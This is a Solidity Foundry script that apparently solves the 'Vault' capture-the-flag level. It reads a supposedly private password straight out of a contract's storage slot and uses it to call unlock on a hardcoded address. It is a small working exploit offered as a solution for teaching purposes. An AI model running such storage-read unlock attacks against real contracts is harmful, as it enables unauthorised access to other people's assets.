// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/08-Vault.sol";

contract VaultSolution is Script {
    Vault public vaultInstance = Vault(0x8b4d68EA5D58130edf14bEE48dEffED9E9e799C1);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        bytes32 password = vm.load(0x8b4d68EA5D58130edf14bEE48dEffED9E9e799C1, bytes32(uint256(1)));
        vaultInstance.unlock(password);
        vm.stopBroadcast();
    }

}